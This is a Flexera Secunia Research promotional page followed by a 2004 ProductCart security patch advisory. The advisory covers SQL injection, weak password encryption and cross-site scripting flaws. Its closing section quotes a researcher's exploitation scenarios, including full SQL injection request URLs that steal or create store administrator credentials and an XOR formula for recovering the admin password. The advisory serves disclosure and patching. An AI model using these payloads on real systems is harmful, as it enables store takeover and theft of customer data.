How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

\*\* ProductCart - Security Patch - 01/30/2004 \*\*
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
----------------------------------
Overview
----------------------------------
Hours ago we were made aware of a security flaw in ProductCart that may
allow a hacker to gain access to the Control Panel of stores using a SQL database
via SQL injection.
Please note that:
(1) We have not received any reports of any successful SQL injection attack.
(2) This security threat does NOT apply to stores using MS Access
(3) Even if the SQL injection attack were successful and the attacker were about to
obtain Control Panel login information (user name & password), the attacker would NOT
be able to locate the Control Panel login page if you have changed the name of the
PCADMIN folder. If you are using ProductCart 2.1 or later and have not applied our
security recommendation to change your "pcadmin" folder name, please
do so immediately. You can find instructions in the following document:
http://www.earlyimpact.com/pdf/ProductCart\_Security\_Tips.pdf
----------------------------------
Brief Description
----------------------------------
This security threat only applies to stores using MS SQL.
An SQL Injection vulnerability was found in the search files (pc/advSearch\_H.asp,
pc/advSearch\_I.asp, pc/advSearch\_L.asp, pc/advSearch\_M.asp, pc/advSearch\_P.asp)
and the customer login page (pc/custva.asp).
A detailed description can be found at the bottom of this message.
----------------------------------
How to address the problem
----------------------------------
Locate your current ProductCart version number (You can find your current
version in the top left corner of the Control Panel welcome page).
Once you have determined your version number, find the appropriate folder in the
Zip file.... the one with the same version as yours. NOTE: Most servers have
Parent Paths Enabled. If you are not sure, please check with your hosting provider.
The files contained in the folder appropriate for your version should be uploaded to
the "pc" folder (under the "ProductCart" folder) on the server.
If you update your store to a later version of the software,
please upload these files again (for the corresponding new version).
ProductCart v2.53 (to be released in Feb 2004) and above will already contain
these updated files. You will not need to reapply this Security Patch once you
have upgraded to ProductCart v2.53 and above.
>> NOTE FOR USERS OF OLD VERSIONS OF PRODUCTCART
If you are running a version of ProductCart that is prior to v1.6, please
contact technical support at support@earlyimpact.com and we will edit your
files manually.
----------------------------------
Detailed Security Threat Description
----------------------------------
This security alert was submitted to Early Impact by S-Quadra (http://www.s-quadra.com/)
>>> S-Quadra Comment: Vulnerability 1: Incorrect use of cryptography
ProductCart uses stream cipher algorithm (possibly RC4) to encrypt various
passwords before storing them in a database. A stream cipher generates a keystream
(a sequence of bits used as a key). Encryption is accomplished by combining the
keystream with the plaintext with the bitwise XOR operation. The generation of the
keystream is independent of the plaintext and ciphertext.
In ProductCart the single cryptographic key used to encrypt all
customers and store administrator passwords so it's possible for an
attacker to perform a choosen plaintext attack and obtain first 100
bytes of keystream (maximum length of customer password). Using this
bytes an attacker can decrypt any encrypted information from the
database including store administrator password.
>>> Early Impact Comment:
By uploading the attached files, a hacker will NOT be able to use the above-described
flaw in the encryption schema to obtain Control Panel access information.
-------------
>>> S-Quadra Comment: Vulnerability 2: SQL Injection vulnerability
A SQL Injection vulnerability has been found in the 'advSearch\_h.asp' script.
Inproper use of user supplied input filters allows an attacker to modify SQL query
and perform some kinds of SQL injection attacks.
Successfull exploitation of this vulnerability could allow an attacker to gain
administrative access to ProductCart store and read any information from store
database (i.e. customers private data). Also an attacker could execute arbitrary
commands using xp\_cmdshell function.
>>> Early Impact Comment:
The attached files have been edited to address this issue.
-------------
>>> S-Quadra Comment: Vulnerability 3: Cross Site Scripting vulnerability in 'CustVa.asp'
By injecting specially crafted javascript code in url and tricking a user to visit
it a remote attacker can steal user session id and gain access to user's personal data.
>>> Early Impact Comment:
The attached files have been edited to address this issue.
-------------
>>> S-Quadra description of how the above-mentioned vulnerabilities could be exploited.
Vulnerability 1 and 2:
Platform: MS SQL Server as a backend
ProductCart software incorrect uses cryptographic algorithms to protect store administrator password. Combination of this error and SQL injection vulnerability allow an attacker to
gain administrative access to store.
Performing following scenarion an attaker can find the store administrator username and password.
Scenario:
1. An attacker register new customer in store. Let the value of field 'Postal Code'
in the registration form will be equal to '987654' and an attacker must select long password
(it should be longer then the store administrator password).
2. An attacker performs the following request
http://www.shop.com/productcart/pc/advSearch\_h.asp?idcategory=0&idSupplier=10&customfield=0&priceUntil=999;u--pdate%20customers%20set%20name=(s--elect%20top%201%20idadmin%20from%20admins),lastName=(s--elect%20top%01%20adminpassword%20from%20admins),phone=(s--elect%20password%20from%20customers%20where%20zip=987654)%20where%20zip=987654;s--elect%20\*%20from%20products%20where%201=1&Submit.y=13&priceFrom=0&sku=&keyWord=dark&IDBrand=0&resultCnt=200&Submit.x=33&
3. An attacker goes to http://www.shop.com/productcart/pc/Custmoda.asp
and reads his personal information. The value of the "FirstName" field
in this form will be store administrator login name. Store administrator
password is easy to find by this formula:
adminpass = (Last Name) xor (Phone) xor (customer login password from scenario step 1)
In the following scenario an attacker can add a new administrator to store
Scenario:
1. An attacker register new customer in store. Let the value of 'First Name' field in registration form will be equal to
'1\*2\*3\*4\*5\*6\*7\*8\*9\*10\*', the value of 'Last Name' field will be equal to
'34567', the value of 'Password' field will be equal to '111' and the
value of 'Postal Code' field will be equal to '987654'.
2. An attacker performs the following request:
http://www.shop.com/productcart/pc/advSearch\_h.asp?idcategory=0&idSupplier=10&customfield=0&priceUntil=999;in--sert%20into%20admins%20(idadmin,%20adminpassword,%20adminlevel)%20s--elect%20lastName,%20password,%20name%20from%20customers%20where%20zip=987654;s--elect%20\*%20from%20products%20where%201=1&Submit.y=13&priceFrom=0&sku=&keyWord=dark&IDBrand=0&resultCnt=200&Submit.x=33&
3. An attacker logs into the store admin interface with username
'34567' and password '111'.
